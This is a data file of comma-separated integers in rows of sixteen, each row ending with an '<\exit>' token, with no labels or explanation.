6291,6292,4816,6293,6294,6295,6296,6297,6298,6299,6300,6301,6302,6303,6304,6305,<\exit>
6306,6307,6308,6309,6310,6311,4817,4818,6312,6313,6314,6315,6316,6317,6318,4819,<\exit>
6319,6320,6321,6322,6323,6324,6325,6326,6327,6328,6329,6330,6331,6332,6333,6334,<\exit>
6335,6336,6337,4820,6338,6339,6340,6341,6342,6343,6344,6345,6346,6347,6348,6349,<\exit>
6350,6351,6352,6353,6354,6355,6356,6357,6358,6359,6360,6361,6362,6363,6364,6365,<\exit>
6366,6367,6368,6369,6370,6371,6372,6373,6374,6375,6376,6377,6378,6379,6380,6381,<\exit>
6382,6383,6384,6385,6386,6387,6388,6389,6390,6391,6392,6393,6394,6395,6396,6397,<\exit>
6398,6399,6400,6401,6402,6403,6404,6405,6406,6407,6408,6409,6410,3441,6411,6412,<\exit>
6413,6414,6415,6416,6417,6418,6419,6420,6421,6422,6423,6424,6425,4440,6426,6427,<\exit>
6428,6429,6430,6431,6432,6433,6434,6435,6436,6437,6438,6439,6440,6441,6442,6443,<\exit>
6444,6445,6446,6447,6448,6449,6450,6451,6452,6453,6454,4821,6455,6456,6457,6458,<\exit>
6459,6460,6461,6462,6463,6464,6465,6466,6467,6468,6469,6470,6471,6472,6473,6474,<\exit>
6475,6476,6477,3947,3948,6478,6479,6480,6481,3272,4441,6482,6483,6484,6485,4442,<\exit>
6486,6487,6488,6489,6490,6491,6492,6493,6494,6495,6496,4822,6497,6498,6499,6500,<\exit>
6501,6502,6503,6504,6505,6506,6507,6508,6509,6510,6511,6512,6513,6514,6515,6516,<\exit>
6517,6518,6519,6520,6521,6522,6523,6524,6525,6526,6527,6528,6529,6530,6531,6532,<\exit>
6533,6534,6535,6536,6537,6538,6539,6540,6541,6542,6543,6544,6545,6546,6547,6548,<\exit>
6549,6550,6551,6552,6553,6554,6555,6556,2784,6557,4823,6558,6559,6560,6561,6562,<\exit>
6563,6564,6565,6566,6567,6568,6569,3949,6570,6571,6572,4824,6573,6574,6575,6576,<\exit>
6577,6578,6579,6580,6581,6582,6583,4825,6584,6585,6586,3950,2785,6587,6588,6589,<\exit>
6590,6591,6592,6593,6594,6595,6596,6597,6598,6599,6600,6601,6602,6603,6604,6605,<\exit>
6606,6607,6608,6609,6610,6611,6612,4826,6613,6614,6615,4827,6616,6617,6618,6619,<\exit>
6620,6621,6622,6623,6624,6625,4164,6626,6627,6628,6629,6630,6631,6632,6633,6634,<\exit>
3547,6635,4828,6636,6637,6638,6639,6640,6641,6642,3951,2984,6643,6644,6645,6646,<\exit>
6647,6648,6649,4165,6650,4829,6651,6652,4830,6653,6654,6655,6656,6657,6658,6659,<\exit>
6660,6661,6662,4831,6663,6664,6665,6666,6667,6668,6669,6670,6671,4166,6672,4832,<\exit>
3952,6673,6674,6675,6676,4833,6677,6678,6679,4167,6680,6681,6682,3198,6683,6684,<\exit>
6685,6686,6687,6688,6689,6690,6691,6692,6693,6694,6695,6696,6697,4834,6698,6699,<\exit>
6700,6701,6702,6703,6704,6705,6706,6707,6708,6709,6710,6711,6712,6713,6714,6715,<\exit>
6716,6717,6718,6719,6720,6721,6722,6723,6724,6725,6726,6727,6728,6729,6730,6731,<\exit>
6732,6733,6734,4443,6735,6736,6737,6738,6739,6740,6741,6742,6743,6744,6745,4444,<\exit>
6746,6747,6748,6749,6750,6751,6752,6753,6754,6755,6756,6757,6758,6759,6760,6761,<\exit>
6762,6763,6764,6765,6766,6767,6768,6769,6770,6771,6772,6773,6774,6775,6776,6777,<\exit>
6778,6779,6780,6781,4168,6782,6783,3442,6784,6785,6786,6787,6788,6789,6790,6791,<\exit>
4169,6792,6793,6794,6795,6796,6797,6798,6799,6800,6801,6802,6803,6804,6805,6806,<\exit>
6807,6808,6809,6810,6811,4835,6812,6813,6814,4445,6815,6816,4446,6817,6818,6819,<\exit>
6820,6821,6822,6823,6824,6825,6826,6827,6828,6829,6830,6831,6832,6833,6834,6835,<\exit>
3548,6836,6837,6838,6839,6840,6841,6842,6843,6844,6845,6846,4836,6847,6848,6849,<\exit>
6850,6851,6852,6853,6854,3953,6855,6856,6857,6858,6859,6860,6861,6862,6863,6864,<\exit>
6865,6866,6867,6868,6869,6870,6871,6872,6873,6874,6875,6876,6877,3199,6878,6879,<\exit>
6880,6881,6882,4447,6883,6884,6885,6886,6887,6888,6889,6890,6891,6892,6893,6894,<\exit>
6895,6896,6897,6898,6899,6900,6901,6902,6903,6904,4170,6905,6906,6907,6908,6909,<\exit>
6910,6911,6912,6913,6914,6915,6916,6917,6918,6919,6920,6921,6922,6923,6924,6925,<\exit>
6926,6927,4837,6928,6929,6930,6931,6932,6933,6934,6935,6936,3346,6937,6938,4838,<\exit>
6939,6940,6941,4448,6942,6943,6944,6945,6946,4449,6947,6948,6949,6950,6951,6952,<\exit>
6953,6954,6955,6956,6957,6958,6959,6960,6961,6962,6963,6964,6965,6966,6967,6968,<\exit>
6969,6970,6971,6972,6973,6974,6975,6976,6977,6978,6979,6980,6981,6982,6983,6984,<\exit>
6985,6986,6987,6988,6989,6990,6991,6992,6993,6994,3671,6995,6996,6997,6998,4839,<\exit>
6999,7000,7001,7002,3549,7003,7004,7005,7006,7007,7008,7009,7010,7011,7012,7013,<\exit>
7014,7015,7016,7017,7018,7019,7020,7021,7022,7023,7024,7025,7026,7027,7028,7029,<\exit>
7030,4840,7031,7032,7033,7034,7035,7036,7037,7038,4841,7039,7040,7041,7042,7043,<\exit>
7044,7045,7046,7047,7048,7049,7050,7051,7052,7053,7054,7055,7056,7057,7058,7059,<\exit>
7060,7061,7062,7063,7064,7065,7066,7067,7068,7069,7070,2985,7071,7072,7073,7074,<\exit>
7075,7076,7077,7078,7079,7080,4842,7081,7082,7083,7084,7085,7086,7087,7088,7089,<\exit>
7090,7091,7092,7093,7094,7095,7096,7097,7098,7099,7100,7101,7102,7103,7104,7105,<\exit>
7106,7107,7108,7109,7110,7111,7112,7113,7114,7115,7116,7117,7118,4450,7119,7120,<\exit>
7121,7122,7123,7124,7125,7126,7127,7128,7129,7130,7131,7132,7133,7134,7135,7136,<\exit>
7137,7138,7139,7140,7141,7142,7143,4843,7144,7145,7146,7147,7148,7149,7150,7151,<\exit>
7152,7153,7154,7155,7156,7157,7158,7159,7160,7161,7162,7163,7164,7165,7166,7167,<\exit>
7168,7169,7170,7171,7172,7173,7174,7175,7176,7177,7178,7179,7180,7181,7182,7183,<\exit>
7184,7185,7186,7187,7188,4171,4172,7189,7190,7191,7192,7193,7194,7195,7196,7197,<\exit>
7198,7199,7200,7201,7202,7203,7204,7205,7206,7207,7208,7209,7210,7211,7212,7213,<\exit>
7214,7215,7216,7217,7218,7219,7220,7221,7222,7223,7224,7225,7226,7227,7228,7229,<\exit>
7230,7231,7232,7233,7234,7235,7236,7237,7238,7239,7240,7241,7242,7243,7244,7245,<\exit>
7246,7247,7248,7249,7250,7251,7252,7253,7254,7255,7256,7257,7258,7259,7260,7261,<\exit>
7262,7263,7264,7265,7266,7267,7268,7269,7270,7271,7272,7273,7274,7275,7276,7277,<\exit>
7278,7279,7280,7281,7282,7283,7284,7285,7286,7287,7288,7289,7290,7291,7292,7293,<\exit>
7294,7295,7296,4844,7297,7298,7299,7300,7301,7302,7303,7304,7305,7306,7307,7308,<\exit>
7309,7310,7311,7312,7313,7314,7315,7316,4451,7317,7318,7319,7320,7321,7322,7323,<\exit>
7324,7325,7326,7327,7328,7329,7330,7331,7332,7333,7334,7335,7336,7337,7338,7339,<\exit>
7340,7341,7342,7343,7344,7345,7346,7347,7348,7349,7350,7351,7352,7353,4173,7354,<\exit>
7355,4845,7356,7357,7358,7359,7360,7361,7362,7363,7364,7365,7366,7367,7368,7369,<\exit>
7370,7371,7372,7373,7374,7375,7376,7377,7378,7379,7380,7381,7382,7383,7384,7385,<\exit>
7386,7387,7388,4846,7389,7390,7391,7392,7393,7394,7395,7396,7397,7398,7399,7400,<\exit>
7401,7402,7403,7404,7405,3672,7406,7407,7408,7409,7410,7411,7412,7413,7414,7415,<\exit>
7416,7417,7418,7419,7420,7421,7422,7423,7424,7425,7426,7427,7428,7429,7430,7431,<\exit>
7432,7433,7434,7435,7436,7437,7438,7439,7440,7441,7442,7443,7444,7445,7446,7447,<\exit>
7448,7449,7450,7451,7452,7453,4452,7454,3200,7455,7456,7457,7458,7459,7460,7461,<\exit>
7462,7463,7464,7465,7466,7467,7468,7469,7470,7471,7472,7473,7474,4847,7475,7476,<\exit>
7477,3133,7478,7479,7480,7481,7482,7483,7484,7485,7486,7487,7488,7489,7490,7491,<\exit>
7492,7493,7494,7495,7496,7497,7498,7499,7500,7501,7502,3347,7503,7504,7505,7506,<\exit>
7507,7508,7509,7510,7511,7512,7513,7514,7515,7516,7517,7518,7519,7520,7521,4848,<\exit>
7522,7523,7524,7525,7526,7527,7528,7529,7530,7531,7532,7533,7534,7535,7536,7537,<\exit>
7538,7539,7540,7541,7542,7543,7544,7545,7546,7547,7548,7549,3801,4849,7550,7551,<\exit>
7552,7553,7554,7555,7556,7557,7558,7559,7560,7561,7562,7563,7564,7565,7566,7567,<\exit>
7568,7569,3035,7570,7571,7572,7573,7574,7575,7576,7577,7578,7579,7580,7581,7582,<\exit>
7583,7584,7585,7586,7587,7588,7589,7590,7591,7592,7593,7594,7595,7596,7597,7598,<\exit>
7599,7600,7601,7602,7603,7604,7605,7606,7607,7608,7609,7610,7611,7612,7613,7614,<\exit>
7615,7616,4850,7617,7618,3802,7619,7620,7621,7622,7623,7624,7625,7626,7627,7628,<\exit>
7629,7630,7631,7632,4851,7633,7634,7635,7636,7637,7638,7639,7640,7641,7642,7643,<\exit>
7644,7645,7646,7647,7648,7649,7650,7651,7652,7653,7654,7655,7656,7657,7658,7659,<\exit>
7660,7661,7662,7663,7664,7665,7666,7667,7668,7669,7670,4453,7671,7672,7673,7674,<\exit>
7675,7676,7677,7678,7679,7680,7681,7682,7683,7684,7685,7686,7687,7688,7689,7690,<\exit>
7691,7692,7693,7694,7695,7696,7697,3443,7698,7699,7700,7701,7702,4454,7703,7704,<\exit>
7705,7706,7707,7708,7709,7710,7711,7712,7713,2472,7714,7715,7716,7717,7718,7719,<\exit>
7720,7721,7722,7723,7724,7725,7726,7727,7728,7729,7730,7731,3954,7732,7733,7734,<\exit>
7735,7736,7737,7738,7739,7740,7741,7742,7743,7744,7745,7746,7747,7748,7749,7750,<\exit>
3134,7751,7752,4852,7753,7754,7755,4853,7756,7757,7758,7759,7760,4174,7761,7762,<\exit>
7763,7764,7765,7766,7767,7768,7769,7770,7771,7772,7773,7774,7775,7776,7777,7778,<\exit>
7779,7780,7781,7782,7783,7784,7785,7786,7787,7788,7789,7790,7791,7792,7793,7794,<\exit>
7795,7796,7797,7798,7799,7800,7801,7802,7803,7804,7805,4854,7806,7807,7808,7809,<\exit>
7810,7811,7812,7813,7814,7815,7816,7817,7818,7819,7820,7821,7822,7823,7824,7825,<\exit>
4855,7826,7827,7828,7829,7830,7831,7832,7833,7834,7835,7836,7837,7838,7839,7840,<\exit>
7841,7842,7843,7844,7845,7846,7847,3955,7848,7849,7850,7851,7852,7853,7854,7855,<\exit>
7856,7857,7858,7859,7860,3444,7861,7862,7863,7864,7865,7866,7867,7868,7869,7870,<\exit>
7871,7872,7873,7874,7875,7876,7877,7878,7879,7880,7881,7882,7883,7884,7885,7886,<\exit>
7887,7888,7889,7890,7891,4175,7892,7893,7894,7895,7896,4856,4857,7897,7898,7899,<\exit>
7900,2598,7901,7902,7903,7904,7905,7906,7907,7908,4455,7909,7910,7911,7912,7913,<\exit>
7914,3201,7915,7916,7917,7918,7919,7920,7921,4858,7922,7923,7924,7925,7926,7927,<\exit>
7928,7929,7930,7931,7932,7933,7934,7935,7936,7937,7938,7939,7940,7941,7942,7943,<\exit>
7944,7945,7946,7947,7948,7949,7950,7951,7952,7953,7954,7955,7956,7957,7958,7959,<\exit>
7960,7961,7962,7963,7964,7965,7966,7967,7968,7969,7970,7971,7972,7973,7974,7975,<\exit>
7976,7977,7978,7979,7980,7981,4859,7982,7983,7984,7985,7986,7987,7988,7989,7990,<\exit>
7991,7992,7993,7994,7995,7996,4860,7997,7998,7999,8000,8001,8002,8003,8004,8005,<\exit>
8006,8007,8008,8009,8010,8011,8012,8013,8014,8015,8016,4176,8017,8018,8019,8020,<\exit>
8021,8022,8023,4861,8024,8025,8026,8027,8028,8029,8030,8031,8032,8033,8034,8035,<\exit>
8036,4862,4456,8037,8038,8039,8040,4863,8041,8042,8043,8044,8045,8046,8047,8048,<\exit>
8049,8050,8051,8052,8053,8054,8055,8056,8057,8058,8059,8060,8061,8062,8063,8064,<\exit>
8065,8066,8067,8068,8069,8070,8071,8072,8073,8074,8075,8076,8077,8078,8079,8080,<\exit>
8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8096,<\exit>
8097,8098,8099,4864,4177,8100,8101,8102,8103,8104,8105,8106,8107,8108,8109,8110,<\exit>
8111,8112,8113,8114,8115,8116,8117,8118,8119,8120,4178,8121,8122,8123,8124,8125,<\exit>
8126,8127,8128,8129,8130,8131,8132,8133,8134,8135,8136,8137,8138,8139,8140,8141,<\exit>
8142,8143,8144,8145,4865,4866,8146,8147,8148,8149,8150,8151,8152,8153,8154,8155,<\exit>
8156,8157,8158,8159,8160,8161,8162,8163,8164,8165,4179,8166,8167,8168,8169,8170,<\exit>
8171,8172,8173,8174,8175,8176,8177,8178,8179,8180,8181,4457,8182,8183,8184,8185,<\exit>
8186,8187,8188,8189,8190,8191,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,<\exit>
8202,8203,8204,8205,8206,8207,8208,8209,8210,8211,8212,8213,8214,8215,8216,8217,<\exit>
8218,8219,8220,8221,8222,8223,8224,8225,8226,8227,8228,8229,8230,8231,8232,8233,<\exit>
8234,8235,8236,8237,8238,8239,8240,8241,8242,8243,8244,8245,8246,8247,8248,8249,<\exit>
8250,8251,8252,8253,8254,8255,8256,3445,8257,8258,8259,8260,8261,8262,4458,8263,<\exit>
8264,8265,8266,8267,8268,8269,8270,8271,8272,4459,8273,8274,8275,8276,3550,8277,<\exit>
8278,8279,8280,8281,8282,8283,8284,8285,8286,8287,8288,8289,4460,8290,8291,8292,<\exit>
8293,8294,8295,8296,8297,8298,8299,8300,8301,8302,8303,8304,8305,8306,8307,4867,<\exit>
8308,8309,8310,8311,8312,3551,8313,8314,8315,8316,8317,8318,8319,8320,8321,8322,<\exit>
8323,8324,8325,8326,4868,8327,8328,8329,8330,8331,8332,8333,8334,8335,8336,8337,<\exit>
8338,8339,8340,8341,8342,8343,8344,8345,8346,8347,8348,8349,8350,8351,8352,8353,<\exit>
8354,8355,8356,8357,8358,8359,8360,8361,8362,8363,4869,4461,8364,8365,8366,8367,<\exit>
8368,8369,8370,4870,8371,8372,8373,8374,8375,8376,8377,8378,8379,8380,8381,8382,<\exit>
8383,8384,8385,8386,8387,8388,8389,8390,8391,8392,8393,8394,8395,8396,8397,8398,<\exit>
8399,8400,8401,8402,8403,8404,8405,8406,8407,8408,8409,8410,4871,8411,8412,8413,<\exit>
8414,8415,8416,8417,8418,8419,8420,8421,8422,4462,8423,8424,8425,8426,8427,8428,<\exit>
8429,8430,8431,8432,8433,2986,8434,8435,8436,8437,8438,8439,8440,8441,8442,8443,<\exit>
8444,8445,8446,8447,8448,8449,8450,8451,8452,8453,8454,8455,8456,8457,8458,8459,<\exit>
8460,8461,8462,8463,8464,8465,8466,8467,8468,8469,8470,8471,8472,8473,8474,8475,<\exit>
8476,8477,8478,4180,8479,8480,8481,8482,8483,8484,8485,8486,8487,8488,8489,8490,<\exit>
8491,8492,8493,8494,8495,8496,8497,8498,8499,8500,8501,8502,8503,8504,8505,8506,<\exit>
8507,8508,8509,8510,8511,8512,8513,8514,8515,8516,8517,8518,8519,8520,8521,8522,<\exit>
8523,8524,8525,8526,8527,8528,8529,8530,8531,8532,8533,8534,8535,8536,8537,8538,<\exit>
8539,8540,8541,8542,8543,8544,8545,8546,8547,8548,8549,8550,8551,8552,8553,8554,<\exit>
8555,8556,8557,8558,8559,8560,8561,8562,8563,8564,4872,8565,8566,8567,8568,8569,<\exit>
8570,8571,8572,8573,4873,8574,8575,8576,8577,8578,8579,8580,8581,8582,8583,8584,<\exit>
8585,8586,8587,8588,8589,8590,8591,8592,8593,8594,8595,8596,8597,8598,8599,8600,<\exit>
8601,8602,8603,8604,8605,3803,8606,8607,8608,8609,8610,8611,8612,8613,4874,3804,<\exit>
8614,8615,8616,8617,8618,8619,8620,8621,3956,8622,8623,8624,8625,8626,8627,8628,<\exit>
8629,8630,8631,8632,8633,8634,8635,8636,8637,8638,2865,8639,8640,8641,8642,8643,<\exit>
8644,8645,8646,8647,8648,8649,8650,8651,8652,8653,8654,8655,8656,4463,8657,8658,<\exit>
8659,4875,4876,8660,8661,8662,8663,8664,8665,8666,8667,8668,8669,8670,8671,8672,<\exit>
8673,8674,8675,8676,8677,8678,8679,8680,8681,4464,8682,8683,8684,8685,8686,8687,<\exit>
8688,8689,8690,8691,8692,8693,8694,8695,8696,8697,8698,8699,8700,8701,8702,8703,<\exit>
8704,8705,8706,8707,8708,8709,2261,8710,8711,8712,8713,8714,8715,8716,8717,8718,<\exit>
8719,8720,8721,8722,8723,8724,8725,8726,8727,8728,8729,8730,8731,8732,8733,4181,<\exit>
8734,8735,8736,8737,8738,8739,8740,8741,8742,8743,8744,8745,8746,8747,8748,8749,<\exit>
8750,8751,8752,8753,8754,8755,8756,8757,8758,8759,8760,8761,8762,8763,4877,8764,<\exit>
8765,8766,8767,8768,8769,8770,8771,8772,8773,8774,8775,8776,8777,8778,8779,8780,<\exit>
8781,8782,8783,8784,8785,8786,8787,8788,4878,8789,4879,8790,8791,8792,4880,8793,<\exit>
8794,8795,8796,8797,8798,8799,8800,8801,4881,8802,8803,8804,8805,8806,8807,8808,<\exit>
8809,8810,8811,8812,8813,8814,8815,3957,8816,8817,8818,8819,8820,8821,8822,8823,<\exit>
8824,8825,8826,8827,8828,8829,8830,8831,8832,8833,8834,8835,8836,8837,8838,8839,<\exit>
8840,8841,8842,8843,8844,8845,8846,8847,4882,8848,8849,8850,8851,8852,8853,8854,<\exit>
8855,8856,8857,8858,8859,8860,8861,8862,8863,8864,8865,8866,8867,8868,8869,8870,<\exit>
8871,8872,8873,8874,8875,8876,8877,8878,8879,8880,8881,8882,8883,8884,3202,8885,<\exit>
8886,8887,8888,8889,8890,8891,8892,8893,8894,8895,8896,8897,8898,8899,8900,8901,<\exit>
8902,8903,8904,8905,8906,8907,8908,8909,8910,8911,8912,8913,8914,8915,8916,8917,<\exit>
8918,8919,8920,8921,8922,8923,8924,4465,8925,8926,8927,8928,8929,8930,8931,8932,<\exit>
4883,8933,8934,8935,8936,8937,8938,8939,8940,8941,8942,8943,2214,8944,8945,8946,<\exit>
8947,8948,8949,8950,8951,8952,8953,8954,8955,8956,8957,8958,8959,8960,8961,8962,<\exit>
8963,8964,8965,4884,8966,8967,8968,8969,8970,8971,8972,8973,8974,8975,8976,8977,<\exit>
8978,8979,8980,8981,8982,8983,8984,8985,8986,8987,8988,8989,8990,8991,8992,4885,<\exit>
8993,8994,8995,8996,8997,8998,8999,9000,9001,9002,9003,9004,9005,9006,9007,9008,<\exit>
9009,9010,9011,9012,9013,9014,9015,9016,9017,9018,9019,9020,9021,4182,9022,9023,<\exit>
9024,9025,9026,9027,9028,9029,9030,9031,9032,9033,9034,9035,9036,9037,9038,9039,<\exit>
9040,9041,9042,9043,9044,9045,9046,9047,9048,9049,9050,9051,9052,9053,9054,9055,<\exit>
9056,9057,9058,9059,9060,9061,9062,9063,4886,9064,9065,9066,9067,9068,9069,4887,<\exit>
9070,9071,9072,9073,9074,9075,9076,9077,9078,9079,9080,9081,9082,9083,9084,9085,<\exit>
9086,9087,9088,9089,9090,9091,9092,9093,9094,9095,9096,9097,9098,9099,9100,9101,<\exit>
9102,9103,9104,9105,9106,9107,9108,9109,9110,9111,9112,9113,9114,9115,9116,9117,<\exit>
9118,9119,9120,9121,9122,9123,9124,9125,9126,9127,9128,9129,9130,9131,9132,9133,<\exit>
9134,9135,9136,9137,9138,9139,9140,9141,3958,9142,9143,9144,9145,9146,9147,9148,<\exit>
9149,9150,9151,4888,9152,9153,9154,9155,9156,9157,9158,9159,9160,9161,9162,9163,<\exit>
9164,9165,9166,9167,9168,9169,9170,9171,9172,9173,9174,9175,4889,9176,9177,9178,<\exit>
9179,9180,9181,9182,9183,9184,9185,9186,9187,9188,9189,9190,9191,9192,9193,9194,<\exit>
9195,9196,9197,9198,9199,9200,9201,9202,9203,4890,9204,9205,9206,9207,9208,9209,<\exit>
9210,9211,9212,9213,9214,9215,9216,9217,9218,9219,9220,9221,9222,4466,9223,9224,<\exit>
9225,9226,9227,9228,9229,9230,9231,9232,9233,9234,9235,9236,9237,9238,9239,9240,<\exit>
9241,9242,9243,9244,9245,4891,9246,9247,9248,9249,9250,9251,9252,9253,9254,9255,<\exit>
9256,9257,4892,9258,9259,9260,9261,4893,4894,9262,9263,9264,9265,9266,9267,9268,<\exit>
9269,9270,9271,9272,9273,4467,9274,9275,9276,9277,9278,9279,9280,9281,9282,9283,<\exit>
9284,9285,3673,9286,9287,9288,9289,9290,9291,9292,9293,9294,9295,9296,9297,9298,<\exit>
9299,9300,9301,9302,9303,9304,9305,9306,9307,9308,9309,9310,9311,9312,9313,9314,<\exit>
9315,9316,9317,9318,9319,9320,9321,9322,4895,9323,9324,9325,9326,9327,9328,9329,<\exit>
9330,9331,9332,9333,9334,9335,9336,9337,9338,9339,9340,9341,9342,9343,9344,9345,<\exit>
9346,9347,4468,9348,9349,9350,9351,9352,9353,9354,9355,9356,9357,9358,9359,9360,<\exit>
9361,9362,9363,9364,9365,9366,9367,9368,9369,9370,9371,9372,9373,4896,9374,4469,<\exit>
9375,9376,9377,9378,9379,4897,9380,9381,9382,9383,9384,9385,9386,9387,9388,9389,<\exit>
9390,9391,9392,9393,9394,9395,9396,9397,9398,9399,9400,9401,9402,9403,9404,9405,<\exit>
9406,4470,9407,2751,9408,9409,3674,3552,9410,9411,9412,9413,9414,9415,9416,9417,<\exit>
9418,9419,9420,9421,4898,9422,9423,9424,9425,9426,9427,9428,9429,3959,9430,9431,<\exit>
9432,9433,9434,9435,9436,4471,9437,9438,9439,9440,9441,9442,9443,9444,9445,9446,<\exit>
9447,9448,9449,9450,3348,9451,9452,9453,9454,9455,9456,9457,9458,9459,9460,9461,<\exit>
9462,9463,9464,9465,9466,9467,9468,9469,9470,9471,9472,4899,9473,9474,9475,9476,<\exit>
9477,4900,9478,9479,9480,9481,9482,9483,9484,9485,9486,9487,9488,3349,9489,9490,<\exit>
9491,9492,9493,9494,9495,9496,9497,9498,9499,9500,9501,9502,9503,9504,9505,9506,<\exit>
9507,9508,9509,9510,9511,9512,9513,9514,9515,9516,9517,9518,9519,9520,4901,9521,<\exit>
9522,9523,9524,9525,9526,4902,9527,9528,9529,9530,9531,9532,9533,9534,9535,9536,<\exit>
9537,9538,9539,9540,9541,9542,9543,9544,9545,9546,9547,9548,9549,9550,9551,9552,<\exit>
9553,9554,9555,9556,9557,9558,9559,9560,9561,9562,9563,9564,9565,9566,9567,9568,<\exit>
9569,9570,9571,9572,9573,9574,9575,9576,9577,9578,9579,9580,9581,9582,9583,9584,<\exit>
3805,9585,9586,9587,9588,9589,9590,9591,9592,9593,9594,9595,9596,9597,9598,9599,<\exit>
9600,9601,9602,4903,9603,9604,9605,9606,9607,4904,9608,9609,9610,9611,9612,9613,<\exit>
9614,4905,9615,9616,9617,9618,9619,9620,9621,9622,9623,9624,9625,9626,9627,9628,<\exit>
9629,9630,9631,9632,4906,9633,9634,9635,9636,9637,9638,9639,9640,9641,9642,9643,<\exit>
4907,9644,9645,9646,9647,9648,9649,9650,9651,9652,9653,9654,9655,9656,9657,9658,<\exit>
9659,9660,9661,9662,9663,9664,9665,9666,9667,9668,9669,9670,9671,9672,4183,9673,<\exit>
9674,9675,9676,9677,4908,9678,9679,9680,9681,4909,9682,9683,9684,9685,9686,9687,<\exit>
9688,9689,9690,4910,9691,9692,9693,3675,9694,9695,9696,2945,9697,9698,9699,9700,<\exit>
9701,9702,9703,9704,9705,4911,9706,9707,9708,9709,9710,9711,9712,9713,9714,9715,<\exit>
9716,9717,9718,9719,9720,9721,9722,9723,9724,9725,9726,9727,9728,9729,9730,9731,<\exit>
9732,9733,9734,9735,4912,9736,9737,9738,9739,9740,4913,9741,9742,9743,9744,9745,<\exit>
9746,9747,9748,9749,9750,9751,9752,9753,9754,9755,9756,9757,9758,4914,9759,9760,<\exit>
9761,9762,9763,9764,9765,9766,9767,9768,9769,9770,9771,9772,9773,9774,9775,9776,<\exit>
9777,9778,9779,9780,9781,9782,4915,9783,9784,9785,9786,9787,9788,9789,9790,9791,<\exit>
9792,9793,4916,9794,9795,9796,9797,9798,9799,9800,9801,9802,9803,9804,9805,9806,<\exit>
9807,9808,9809,9810,9811,9812,9813,9814,9815,9816,9817,9818,9819,9820,9821,9822,<\exit>
9823,9824,9825,9826,9827,9828,9829,9830,9831,9832,9833,9834,9835,9836,9837,9838,<\exit>
9839,9840,9841,9842,9843,9844,9845,9846,9847,9848,9849,9850,9851,9852,9853,9854,<\exit>
9855,9856,9857,9858,9859,9860,9861,9862,9863,9864,9865,9866,9867,9868,4917,9869,<\exit>
9870,9871,9872,9873,9874,9875,9876,9877,9878,9879,9880,9881,9882,9883,9884,9885,<\exit>
9886,9887,9888,9889,9890,9891,9892,4472,9893,9894,9895,9896,9897,3806,9898,9899,<\exit>
9900,9901,9902,9903,9904,9905,9906,9907,9908,9909,9910,9911,9912,9913,9914,4918,<\exit>
9915,9916,9917,4919,9918,9919,9920,9921,4184,9922,9923,9924,9925,9926,9927,9928,<\exit>
9929,9930,9931,9932,9933,9934,9935,9936,9937,9938,9939,9940,9941,9942,9943,9944,<\exit>
9945,9946,4920,9947,9948,9949,9950,9951,9952,9953,9954,9955,4185,9956,9957,9958,<\exit>
9959,9960,9961,9962,9963,9964,9965,4921,9966,9967,9968,4473,9969,9970,9971,9972,<\exit>
9973,9974,9975,9976,9977,4474,9978,9979,9980,9981,9982,9983,9984,9985,9986,9987,<\exit>
9988,9989,9990,9991,9992,9993,9994,9995,9996,9997,9998,9999,10000,10001,10002,10003,<\exit>
10004,10005,10006,10007,10008,10009,10010,10011,10012,10013,10014,10015,10016,10017,10018,10019,<\exit>
10020,10021,4922,10022,4923,10023,10024,10025,10026,10027,10028,10029,10030,10031,10032,10033,<\exit>
10034,10035,10036,10037,10038,10039,10040,10041,10042,10043,10044,10045,10046,10047,10048,4924,<\exit>
10049,10050,10051,10052,10053,10054,10055,10056,10057,10058,10059,10060,10061,10062,10063,10064,<\exit>
10065,10066,10067,10068,10069,10070,10071,10072,10073,10074,10075,10076,10077,10078,10079,10080,<\exit>
10081,10082,10083,10084,10085,10086,10087,4475,10088,10089,10090,10091,10092,10093,10094,10095,<\exit>
10096,10097,4476,10098,10099,10100,10101,10102,10103,10104,10105,10106,10107,10108,10109,10110,<\exit>
10111,2174,10112,10113,10114,10115,10116,10117,10118,10119,10120,10121,10122,10123,10124,10125,<\exit>
10126,10127,10128,10129,10130,10131,10132,10133,10134,10135,10136,10137,10138,10139,10140,3807,<\exit>
4186,4925,10141,10142,10143,10144,10145,10146,10147,4477,4187,10148,10149,10150,10151,10152,<\exit>
10153,4188,10154,10155,10156,10157,10158,10159,10160,10161,4926,10162,10163,10164,10165,10166,<\exit>
10167,10168,10169,10170,10171,10172,10173,10174,10175,10176,10177,10178,10179,10180,10181,10182,<\exit>
10183,10184,10185,10186,10187,10188,10189,10190,10191,10192,3203,10193,10194,10195,10196,10197,<\exit>
10198,10199,10200,4478,10201,10202,10203,10204,4479,10205,10206,10207,10208,10209,10210,10211,<\exit>
10212,10213,10214,10215,10216,10217,10218,10219,10220,10221,10222,10223,10224,10225,10226,10227,<\exit>
10228,10229,10230,10231,10232,10233,10234,4927,10235,10236,10237,10238,10239,10240,10241,10242,<\exit>
10243,10244,10245,10246,10247,10248,10249,10250,10251,10252,10253,10254,10255,10256,10257,10258,<\exit>
10259,10260,10261,10262,10263,10264,10265,10266,10267,10268,10269,10270,10271,10272,10273,4480,<\exit>
4928,4929,10274,10275,10276,10277,10278,10279,10280,10281,10282,10283,10284,10285,10286,10287,<\exit>
10288,10289,10290,10291,10292,10293,10294,10295,10296,10297,10298,10299,10300,10301,10302,10303,<\exit>
10304,10305,10306,10307,10308,10309,10310,10311,10312,10313,10314,10315,10316,10317,10318,10319,<\exit>
10320,10321,10322,10323,10324,10325,10326,10327,10328,10329,10330,10331,10332,10333,10334,4930,<\exit>
10335,10336,10337,10338,10339,10340,10341,10342,4931,10343,10344,10345,10346,10347,10348,10349,<\exit>
10350,10351,10352,10353,10354,10355,3088,10356,2786,10357,10358,10359,10360,4189,10361,10362,<\exit>
10363,10364,10365,10366,10367,10368,10369,10370,10371,10372,10373,10374,10375,4932,10376,10377,<\exit>
10378,10379,10380,10381,10382,10383,10384,10385,10386,10387,10388,10389,10390,10391,10392,4933,<\exit>
10393,10394,10395,4934,10396,10397,10398,10399,10400,10401,10402,10403,10404,10405,10406,10407,<\exit>
10408,10409,10410,10411,10412,3446,10413,10414,10415,10416,10417,10418,10419,10420,10421,10422,<\exit>
10423,4935,10424,10425,10426,10427,10428,10429,10430,4936,10431,10432,10433,10434,10435,10436,<\exit>
10437,10438,10439,10440,10441,10442,10443,4937,10444,10445,10446,10447,4481,10448,10449,10450,<\exit>
10451,10452,10453,10454,10455,10456,10457,10458,10459,10460,10461,10462,10463,10464,10465,10466,<\exit>
